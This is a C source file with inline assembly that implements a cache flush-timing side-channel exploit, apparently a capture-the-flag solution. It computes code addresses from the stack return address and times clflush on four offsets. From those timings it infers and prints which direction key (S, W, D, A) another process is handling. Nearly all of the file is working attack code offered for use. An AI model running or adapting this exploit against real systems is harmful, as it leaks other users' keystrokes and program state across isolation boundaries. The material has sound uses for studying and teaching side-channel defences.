#include "cacheutils.h"
#include "utils.h"
#include <asm/unistd_64.h>
#include <stdint.h>
#include <sys/mman.h>
#include <asm/unistd.h>
#include <math.h>

#define loop(var, end)for (int var = 0; var < (end); var++)
#define flush(addr)_mm_clflush((const void *)(addr))
#define clamp(victim, low, high)(victim > (high) ? (high) : MAX(low, victim))

#define LBOUND (0)
#define CYCLES (1000)

i64 time_access(u64 addr);
i64 tf(u64 addr);

void memset(void *dst, char ch, size_t cnt) {
    for (size_t i = 0; i < cnt; i++) {
        *(char *)(dst + i) = ch;
    }
}

__attribute__((naked, noinline))
i64 nothing() {
    asm volatile(
        "mfence\n"
        "lfence\n"
        "rdtsc\n"
        "mov rsi, rax\n"
        "lfence\n"
        "mfence\n"
        "lfence\n"
        "rdtsc\n"
        "lfence\n"
        "sub rax, rsi\n"
        "ret\n"
    );
}

int exploit(u64 *stack, int idx) {
    u64 retaddr = *(stack + 1);
    u64 mem = retaddr - 0x12ff;
    u64 offset = 0x1400;
    u64 offsets[] = { 0x17a0, 0x1660, 0x1530, 0x1400, };
    char directions[] = { 'S', 'W', 'D', 'A', };

    print("start\n");
    print("mem: "); hex(mem); putchar('\n');

    u64 kpause = 0;
    u64 iter = 0;
    u64 range[32] = {0};
    while (1) {
    restart:;
        i64 flushes[4] = {0};

        #define ITER 5

        for (int i = 0; i < ITER; i++) {
            flushes[0] += tf(mem + 0x17a0 + 0xd0);
            flushes[1] += tf(mem + 0x1660 + 0xd0);
            flushes[2] += tf(mem + 0x1530 + 0xd0);
            flushes[3] += tf(mem + 0x1400 + 0xd0);
            delay(100);
        }
        flushes[0] /= ITER;
        flushes[1] /= ITER;
        flushes[2] /= ITER;
        flushes[3] /= ITER;

        i64 sum = 0;
        int count = -1;
        for (int i = 0; i < 4; i++) {
            if (300 <= flushes[i] && flushes[i] <= 600) {
                count += 1;
                sum += flushes[i];
            } else {
                flushes[i] = 0;
            }
        }
        count = count <= 0 ? 1 : count;

        for (int i = 0; i < 4; i++) {
            i64 avg = (sum - flushes[i]) / count;
            if (flushes[i] >= 560 && flushes[i] - 200 >= avg) {
                print("\navg: "); dec(avg);
                print(", flush: "); dec(flushes[i]);
                print(", diff: "); dec(flushes[i] - avg);
                print(", char: "); putchar(directions[i]);
            }
        }
    }
}

void __attribute__((section(".entry"))) main () {
    u64* stack;
    asm volatile(
        "mov %[stack], rsp\n"
        : [stack] "=r" (stack)
    );
    exploit(stack, 3);
    print("[+] exploit done\n");
    exit(7);
}


__attribute__((naked, noinline))
i64 time_access(u64 addr) {
    asm volatile(
        "mfence\n"
        "lfence\n"
        "rdtsc\n"
        "mov rsi, rax\n"
        "lfence\n"
        "mov rax, qword ptr [rdi]\n"
        "lfence\n"
        "rdtsc\n"
        "sub rax, rsi\n"
        "ret\n"
    );
}

__attribute__((naked, noinline))
i64 tf(u64 addr) {
    asm volatile(
        "mfence\n"
        "lfence\n"
        "rdtsc\n"
        "mov rsi, rax\n"
        "lfence\n"
        "clflush byte ptr [rdi]\n"
        "mfence\n"
        "lfence\n"
        "rdtsc\n"
        "lfence\n"
        "sub rax, rsi\n"
        "ret\n"
    );
}